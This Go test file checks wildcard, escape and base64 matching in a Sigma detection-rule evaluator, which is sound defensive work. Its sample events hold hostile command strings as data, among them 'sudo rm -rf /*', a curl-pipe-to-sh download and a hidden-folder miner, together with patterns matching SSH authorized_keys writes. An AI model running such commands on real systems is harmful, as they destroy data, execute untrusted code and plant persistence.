package evaluator

import (
	"context"
	"testing"

	"github.com/bradleyjkemp/sigma-go"
)

// Values that aren't in RuleEvaluatorBundle's needle set must still be matched by the bundle
func TestRuleEvaluatorBundle_Matches_UnindexedValues(t *testing.T) {
	rule, err := sigma.ParseRule([]byte(`
title: unindexed values
logsource:
  product: test
detection:
  plain:
    CommandLine|contains: 'unrelated'
  encoded:
    CommandLine|base64|contains: 'whoami'
  wildcard:
    CommandLine|contains: 'who*mi'
  condition: encoded and wildcard
`))
	if err != nil {
		t.Fatalf("error parsing rule: %v", err)
	}

	event := map[string]interface{}{"CommandLine": "d2hvYW1p who-am-mi"} // base64("whoami")
	result, err := ForRule(rule).Matches(context.Background(), event)
	if err != nil {
		t.Fatalf("error evaluating rule: %v", err)
	}
	bundleResults, err := ForRules([]sigma.Rule{rule}).Matches(context.Background(), event)
	if err != nil {
		t.Fatalf("error evaluating rule bundle: %v", err)
	}
	if !result.Match {
		t.Errorf("rule should have matched: %v", result.SearchResults)
	}
	if len(bundleResults) != 1 || bundleResults[0].Match != result.Match {
		t.Errorf("bundle results = %v, want Match = %v", bundleResults, result.Match)
	}
}

// Values can contain the wildcards * and ?, which can be escaped with a backslash.
// https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-rules-specification.md#string-wildcard
// https://github.com/SigmaHQ/sigma-specification/blob/main/specification/sigma-rules-specification.md#escape-character
func TestRuleEvaluator_Matches_Wildcards(t *testing.T) {
	tests := []struct {
		name      string
		selection string
		event     map[string]interface{}
		want      bool
	}{
		{
			name:      "plain value with wildcard",
			selection: `Image: 'C:\Windows\\*\cmd.exe'`,
			event:     map[string]interface{}{"Image": `C:\Windows\System32\cmd.exe`},
			want:      true,
		},
		{
			name:      "plain value with single character wildcard",
			selection: `User: 'admin?'`,
			event:     map[string]interface{}{"User": "admin1"},
			want:      true,
		},
		{
			name:      "plain value with wildcard doesn't match",
			selection: `User: 'admin?'`,
			event:     map[string]interface{}{"User": "admin"},
			want:      false,
		},
		{
			name:      "contains with wildcard",
			selection: `CommandLine|contains: ' -e* '`,
			event:     map[string]interface{}{"CommandLine": "powershell.exe -EncodedCommand AAAA"},
			want:      true,
		},
		{
			name:      "contains with escaped wildcard",
			selection: `CommandLine|contains: 'rm -rf /\*'`,
			event:     map[string]interface{}{"CommandLine": "rm -rf /tmp"},
			want:      false,
		},
		{
			name:      "contains with escaped wildcard matches the literal character",
			selection: `CommandLine|contains: 'rm -rf /\*'`,
			event:     map[string]interface{}{"CommandLine": "sudo rm -rf /*"},
			want:      true,
		},
		{
			name:      "contains with escaped backslash",
			selection: `CommandLine|contains: 'C:\\Temp\\'`,
			event:     map[string]interface{}{"CommandLine": `copy x C:\Temp\x`},
			want:      true,
		},
		{
			name:      "startswith with wildcard",
			selection: `CommandLine|startswith: '/tmp/*/'`,
			event:     map[string]interface{}{"CommandLine": "/tmp/.x/miner --donate-level 1"},
			want:      true,
		},
		{
			name:      "endswith with wildcard",
			selection: `TargetFilename|endswith: '/.ssh/authorized_key?'`,
			event:     map[string]interface{}{"TargetFilename": "/root/.ssh/authorized_keys"},
			want:      true,
		},
		{
			name: "all modifier with wildcards",
			selection: `CommandLine|contains|all:
      - 'curl * | '
      - 'sh'`,
			event: map[string]interface{}{"CommandLine": "curl http://example.com/x | sh"},
			want:  true,
		},
		{
			name:      "value modifiers are applied to values with escape sequences",
			selection: `CommandLine|base64|contains: 'C:\Windows'`,
			event:     map[string]interface{}{"CommandLine": "QzpcV2luZG93cw=="},
			want:      true,
		},
		{
			name:      "regular expressions are not affected",
			selection: `CommandLine|re: '^a.*b$'`,
			event:     map[string]interface{}{"CommandLine": "aXXb"},
			want:      true,
		},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			rule, err := sigma.ParseRule([]byte("title: wildcards\nlogsource:\n  product: test\ndetection:\n  selection:\n    " + tt.selection + "\n  condition: selection"))
			if err != nil {
				t.Fatalf("error parsing rule: %v", err)
			}

			result, err := ForRule(rule).Matches(context.Background(), tt.event)
			if err != nil {
				t.Fatalf("error evaluating rule: %v", err)
			}
			if result.Match != tt.want {
				t.Errorf("Match = %v, want %v", result.Match, tt.want)
			}

			// the bundle evaluator must agree with the standalone evaluator
			bundleResults, err := ForRules([]sigma.Rule{rule}).Matches(context.Background(), tt.event)
			if err != nil {
				t.Fatalf("error evaluating rule bundle: %v", err)
			}
			if len(bundleResults) != 1 || bundleResults[0].Match != tt.want {
				t.Errorf("bundle results = %v, want Match = %v", bundleResults, tt.want)
			}
		})
	}
}
